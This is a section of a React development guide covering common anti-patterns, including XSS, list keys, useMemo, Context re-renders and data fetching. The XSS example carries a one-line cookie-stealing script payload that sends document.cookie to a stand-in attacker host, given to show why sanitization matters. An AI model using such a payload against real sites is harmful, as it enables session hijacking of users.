## 10. Common Pitfalls & Anti-Patterns

### 🔴 High Severity

**Anti-Pattern 1: XSS via User Content Rendering

```markdown
❌ BAD: Rendering untrusted user content directly
const Comment = ({ text }) => (
  <p dangerouslySetInnerHTML={{ __html: text }} />
);
// Attacker submits: <script>fetch('attacker.com?c='+document.cookie)</script>
// → Session hijacking for every user who sees this comment

✅ GOOD: Sanitize before rendering (or avoid HTML entirely)
import DOMPurify from 'dompurify';
const Comment = ({ text }) => (
  <p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />
);
// OR: Use a markdown renderer that doesn't allow raw HTML
```

**Anti-Pattern 2: Missing Keys (or Wrong Keys) in Lists

```markdown
❌ BAD 1: No key
items.map(item => <Item {...item} />)
// React can't identify elements → wrong DOM updates, animations break

❌ BAD 2: Index as key (for mutable lists)
items.map((item, index) => <Item key={index} {...item} />)
// Deleting item at index 0 → all keys shift → React re-renders everything

✅ GOOD: Stable unique ID as key
items.map(item => <Item key={item.id} {...item} />)
```

### 🟡 Medium Severity

**Anti-Pattern 3: Premature useMemo

```markdown
❌ BAD: Memoizing cheap operations
const doubled = useMemo(() => count * 2, [count]);  // 0.001ms calculation
// Memoization overhead (dependency comparison) likely costs more than just computing

✅ GOOD: Only memoize when profiling proves it's needed
// Profile with React DevTools Profiler first
// useMemo is justified when: computation >1ms, or expensive component re-render prevented
const sortedList = useMemo(
  () => [...items].sort(complexSort),  // sorting 10,000 items: YES, worth memoizing
  [items]
);
```

**Anti-Pattern 4: Context for High-Frequency Updates

```markdown
❌ BAD: User typing updates Context → all consumers re-render
const SearchContext = createContext({ query: '', setQuery: () => {} });
// Every keystroke re-renders all consumers of SearchContext
// A tree with 50 context consumers = 50 re-renders per keystroke

✅ GOOD: Use Zustand selector for high-frequency global state
const query = useSearchStore(state => state.query);  // Only this component re-renders
const setQuery = useSearchStore(state => state.setQuery);  // Stable reference, no re-render
```

**Anti-Pattern 5: Blocking Render with Data Fetching

```markdown
❌ BAD: useEffect data fetch causes loading waterfall
function UserPage({ userId }) {
  const [user, setUser] = useState(null);
  useEffect(() => { fetchUser(userId).then(setUser); }, [userId]);
  if (!user) return <Spinner />;
  return <Profile user={user} />;
}
// Page shows spinner → data arrives → render. No streaming, no caching, no deduplication.

✅ GOOD: TanStack Query with caching and background refresh
function UserPage({ userId }) {
  const { data: user, isLoading } = useQuery({
    queryKey: ['user', userId],
    queryFn: () => fetchUser(userId),
    staleTime: 5 * 60 * 1000,  // Don't refetch for 5 minutes
  });
  if (isLoading) return <UserSkeleton />;
  return <Profile user={user} />;
}
// Caches result; deduplicates concurrent requests; background refresh; optimistic updates
```

---

